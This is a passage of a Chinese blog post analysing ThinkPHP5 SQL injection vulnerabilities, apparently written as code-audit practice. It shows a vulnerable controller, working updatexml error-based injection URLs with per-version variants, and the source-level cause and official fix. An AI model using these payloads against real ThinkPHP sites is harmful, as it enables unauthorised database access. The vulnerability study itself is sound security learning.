+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030224610437.png" srcset="/img/loading.gif" lazyload alt="image-20211030224610437"></p>
+<p>最后被拼接到了SQL语句中，造成了SQL注入</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030234224569.png" srcset="/img/loading.gif" lazyload alt="image-20211030234224569"></p>
+<p>官方的修复方法是对变量就行了检查，判断是否存在<code>)</code> <code>#</code></p>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lyj20010728/article/details/119685805">https://blog.csdn.net/lyj20010728/article/details/119685805</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.codetd.com/article/13124414">https://www.codetd.com/article/13124414</a></p>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/04/01/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A55/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">https://mochazz.github.io/2019/04/01/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A55/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></p>
+<h4 id="SQL6"><a href="#SQL6" class="headerlink" title="SQL6"></a>SQL6</h4><p>影响版本</p>
+<p><code>5.0.0&lt;=ThinkPHP&lt;=5.0.21</code></p>
+<p><code>5.1.3&lt;=ThinkPHP&lt;=5.1.25</code></p>
+<p><strong>环境配置</strong></p>
+<p>还是利用上面的漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $options = request()-&gt;get(<span class="hljs-string">&#x27;options&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;max($options);<br>        var_dump($result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>需要开启 app_debug 和 app_trace</p>
+<p><strong>漏洞复现</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/public/index.php/index/index/index?options=id`)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031000952539.png" srcset="/img/loading.gif" lazyload alt="image-20211031000952539"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031003033967.png" srcset="/img/loading.gif" lazyload alt="image-20211031003033967"></p>
+<p>不同版本的 payload 有一定的差别</p>
+<blockquote>
+<p>5.0.0~5.0.21、5.1.3～5.1.10: id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p>
+<p>5.1.11～5.1.25: id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p>
+</blockquote>
+<p><strong>漏洞分析</strong></p>
+<p>直接根据 payload 传入的位置分析</p>
+<p>先是对输入的 payload 进行了一些处理，加上了括号和反引号，之后就会进入<code>select()</code> 函数去进行SQL语句的拼接</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010520705.png" srcset="/img/loading.gif" lazyload alt="image-20211031010520705"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010535400.png" srcset="/img/loading.gif" lazyload alt="image-20211031010535400"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010558540.png" srcset="/img/loading.gif" lazyload alt="image-20211031010558540"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010810261.png" srcset="/img/loading.gif" lazyload alt="image-20211031010810261"></p>
+<p>最后构造的结果是这个样</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031012135626.png" srcset="/img/loading.gif" lazyload alt="image-20211031012135626"></p>
+<p>官方的修复方法就是在<code>parseKey()</code>过滤了一些 字母 点号 星号 以外的字符</p>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/04/02/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/">https://mochazz.github.io/2019/04/02/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个只是参考了别的大师傅的文章复现了一下SQL漏洞，主要是为了提升代码审计的能力也是为了能够了解ThinkPHP框架，并且在审计的过程中发现ThinkPHP的注入漏洞都在 Build 类中的方法。但是对于自己想挖这样的漏洞出来还是很不容易的…………继续学习吧希望有一天能够自己审计出一个0day。经过这几个漏洞的分析，框架的调试能力也熟练了许多。</p>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/">https://mochazz.github.io/</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/post/thinkphp5-source-read/">https://y4er.com/post/thinkphp5-source-read/</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/post/thinkphp5-rce/">https://y4er.com/post/thinkphp5-rce/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.1.html">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.1.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web/">Web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/28/yii2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE/">
+                        <span class="hidden-mobile">yii2 反序列化POP链</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
